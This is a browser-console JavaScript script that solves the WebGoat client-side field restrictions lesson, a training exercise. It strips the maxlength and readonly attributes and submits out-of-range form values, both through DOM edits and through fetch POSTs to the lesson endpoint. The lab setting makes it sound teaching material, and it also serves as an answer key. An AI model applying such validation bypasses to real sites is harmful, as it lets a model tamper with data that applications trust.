// ============================================================
// Client-Side Field Restrictions Bypass - Browser Console
// ============================================================
// Copy this entire script into browser console (F12)
// ============================================================

console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('%cField Restrictions Bypass Attack', 'color: cyan; font-weight: bold');
console.log('%c====================================', 'color: cyan; font-weight: bold');
console.log('');

// Method 1: Direct manipulation and submit
function bypassAndSubmit() {
    console.log('%c[Method 1] Direct bypass and submit', 'color: yellow; font-weight: bold');
    
    try {
        // Bypass select restriction
        const selectField = document.querySelector('select[name="select"]');
        selectField.value = 'option3';
        console.log('✓ Select field bypassed: option3');
        
        // Bypass radio restriction
        const radioField = document.querySelector('input[name="radio"]:checked');
        radioField.value = 'option3';
        console.log('✓ Radio button bypassed: option3');
        
        // Bypass checkbox restriction
        const checkboxField = document.querySelector('input[name="checkbox"]');
        checkboxField.value = 'different';
        console.log('✓ Checkbox bypassed: different');
        
        // Bypass maxlength restriction
        const shortField = document.querySelector('input[name="shortInput"]');
        shortField.removeAttribute('maxlength');
        shortField.value = 'thisIsLongerThan5Characters';
        console.log('✓ Short input bypassed: thisIsLongerThan5Characters');
        
        // Bypass readonly restriction
        const readonlyField = document.querySelector('input[name="readOnlyInput"]');
        readonlyField.removeAttribute('readonly');
        readonlyField.value = 'hacked';
        console.log('✓ Readonly input bypassed: hacked');
        
        console.log('');
        console.log('%cSubmitting form...', 'color: green; font-weight: bold');
        
        // Submit the form
        const form = document.querySelector('form[name="fieldRestrictions"]');
        form.submit();
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Method 2: Fetch API with custom values
async function bypassWithFetch() {
    console.log('%c[Method 2] Bypass with Fetch API', 'color: yellow; font-weight: bold');
    
    const payload = new URLSearchParams({
        select: 'option3',
        radio: 'option3',
        checkbox: 'different',
        shortInput: 'thisIsLongerThan5Characters',
        readOnlyInput: 'hacked'
    });
    
    console.log('Payload:', payload.toString());
    
    try {
        const response = await fetch('/WebGoat/BypassRestrictions/FieldRestrictions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: payload.toString(),
            credentials: 'include'
        });
        
        const result = await response.json();
        
        console.log('');
        console.log('%cResponse:', 'color: green; font-weight: bold');
        console.log('Feedback:', result.feedback);
        console.log('Lesson Completed:', result.lessonCompleted);
        
        if (result.lessonCompleted === true) {
            console.log('%c✓ SUCCESS! Challenge completed!', 'color: green; font-weight: bold; font-size: 16px');
        } else {
            console.log('%cTry Method 1 instead', 'color: yellow');
        }
        
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Method 3: Try multiple payloads
async function tryMultiplePayloads() {
    console.log('%c[Method 3] Trying multiple payloads', 'color: yellow; font-weight: bold');
    
    const payloads = [
        { select: 'option3', radio: 'option3', checkbox: 'different', shortInput: 'thisIsLongerThan5Characters', readOnlyInput: 'hacked' },
        { select: 'admin', radio: 'both', checkbox: 'yes', shortInput: '1234567890', readOnlyInput: 'modified' },
        { select: '999', radio: '0', checkbox: '1', shortInput: '123456789012345', readOnlyInput: 'pwned' },
        { select: 'hack', radio: 'all', checkbox: 'true', shortInput: 'verylonginput', readOnlyInput: 'changed' }
    ];
    
    for (let i = 0; i < payloads.length; i++) {
        console.log(`\nTrying payload ${i + 1}...`);
        
        const payload = new URLSearchParams(payloads[i]);
        
        try {
            const response = await fetch('/WebGoat/BypassRestrictions/FieldRestrictions', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: payload.toString(),
                credentials: 'include'
            });
            
            const result = await response.json();
            console.log('Feedback:', result.feedback);
            
            if (result.lessonCompleted === true) {
                console.log('%c✓ SUCCESS with payload ' + (i + 1) + '!', 'color: green; font-weight: bold; font-size: 16px');
                console.log('Winning payload:', payloads[i]);
                return;
            }
            
        } catch (error) {
            console.error('Error:', error.message);
        }
        
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Display menu
console.log('');
console.log('%cChoose a method:', 'color: cyan; font-weight: bold');
console.log('');
console.log('%c1. bypassAndSubmit()      ', 'color: white', '← Direct DOM manipulation (RECOMMENDED)');
console.log('%c2. bypassWithFetch()      ', 'color: white', '← Single Fetch API attack');
console.log('%c3. tryMultiplePayloads()  ', 'color: white', '← Try multiple payloads');
console.log('');
console.log('%cExample: Type "bypassAndSubmit()" and press Enter', 'color: yellow');
console.log('');
